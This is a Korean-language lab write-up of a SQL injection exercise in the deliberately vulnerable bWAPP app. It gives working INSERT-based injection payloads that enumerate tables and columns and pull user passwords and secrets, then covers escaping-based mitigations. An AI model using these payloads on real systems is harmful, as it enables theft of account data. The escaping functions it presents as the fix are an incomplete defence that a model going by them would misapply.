---
title: "[bWAPP] 1. Injection - SQL Injection - (SQLite)"
---

<br>

## Injection

공격자가 신뢰할 수 없는 입력을 프로그램에 주입하도록 하는 공격.

<br>

<br>

## SQL Injection

응용 프로그램 보안 상의 허점을 의도적으로 이용해, 

임의의 SQL문을 주입하여 악의적인 SQL문을 실행하게 함으로써

DB를 비정상적으로 조작하는 코드 인젝션의 대표적인 공격.

이로인해 공격자가 DB에 저장되어 있는 다른 사용자의 개인 정보 등 허가되지 않은 정보에 접근하여,

데이터 변조 및 조작 가능.

<br>

<br>

## Injection - Stored

공격자가 서버(게시판)에 태그/스크립트를 저장시켜, 클라이언트가 게시판을 읽을 경우 태그/스크립트가 실행되는 방식.

이로 인해 쿠키 정보 탈취, 악성 코드 유입, 랜섬웨어 등의 피해로 이어질 수 있음.

<br>

<br>

## Object

개인정보를 탈취해보자

![image-20220316224002844](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220316224002844.png)

- SQL 구문오류가 있는지 파악해보자

<BR>

![image-20220316224222471](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220316224222471.png)

- SQL syntax 오류가 있다고 확인, 마지막에 'bee')' 라는 힌트 얻음
- SQL문을 추측해보자

<BR>

![image-20220316224408511](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220316224408511.png)

- 'test', 'bee')' 힌트로 test 앞에 작은 따옴표를 두고 넣어보니 그대로 출력된 것 확인

<br>

![image-20220316224544742](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220316224544742.png)

- test 입력해보니 아까 힌트로 얻었던 bee 가 Owner 인 것 확인했고 'test를 그대로 출력헀던 곳이 Entry임을 확인
- 자 그럼 sql문을 유추해보면

`insert into table_name('#', 'Date', 'Entry', 'Owner')`

- 다음과 같이 형성 되어있을거라 판단
- 이제 저 Entry에 SQL문을 삽입해보자.

`test', (select table_name from information_schema where table_schema='bWAPP' limit 0,1))#`

- test로 엔트리에 입력해주고 작은따옴표 닫아준 후 콤마를 찍어줘서 엔트리 조건을 충족시켜준 후에
- 바로 괄호를 열고 우리가 원하는 select 문을 삽입해준다.
- 그러고 괄호를 닫아주고 insert into table_name의 괄호도 충족시키기위해 하나 더 닫아주고
- 뒤에는 날려버릴거기에 주석으로 처리해준다

`insert into table_name('#', 'Date', 'test', (select table_name from information_schema where table_schema='bWAPP' limit 0,1))#', 'Owner')`

- 최종적으로는 이렇게 나올것이다.

<br>

### 테이블 이름

![image-20220316225443448](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220316225443448.png)

`test', (select table_name from information_schema.tables where table_schema='bWAPP' limit 3,1))#`

- 이런식으로 limit를 활용해서 조회해보자
  -  limit n,m ->  n번째의 m개만 출력이라는 뜻

<br>

### 컬럼 이름

![image-20220316225715936](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220316225715936.png)

`test', (select column_name from information_schema.columns where table_name='heroes' limit 3,1)) #`

<br>

### 결과

![image-20220316225924971](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220316225924971.png)

`test', (select concat(id,password,secret,login) from users limit 0,1))#`

- concat을 이용해 한꺼번에 조회할 수 있다.
- 성공적으로 계정 정보 탈취완료.

<br>

<br>

## 대응방안

### Linux

![image-20220318003429351](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220318003429351.png)

![image-20220318002653266](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220318002653266.png)

- vi 편집기로 sqli_7.php 소스코드를 열어준다.
- level 1 : sqli_check_1 함수 사용
- level 2 : sqli_check_3 함수 사용

<br>

### functions_external.php

![image-20220318003522652](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220318003522652.png)

- addslashes : 특수 문자(',",/) 앞에 역슬래시를 삽입하여 특수문자 기능을 문자로 이스케이프하는 함수
  - 인코딩된 태그나 스크립트가 들어오면 바로 디코딩되기 때문에 보안 허점 발생
- mysql_real_escape_string : PHP에서 SQL Injection 공격 등을 방어하기 위하여 특수 문자열을 이스케이프 하기 위한 함수
  - `\x00, \n, \r, \, ', ", \x1a`와 같은 문자 앞에 `\`(역슬레시)를 붙여서 해당 문자가 실제 작동하지 않도록 이스케이프 해준다.
  - addslashes 보다 처리할 수 있는 문자들이 더 많음
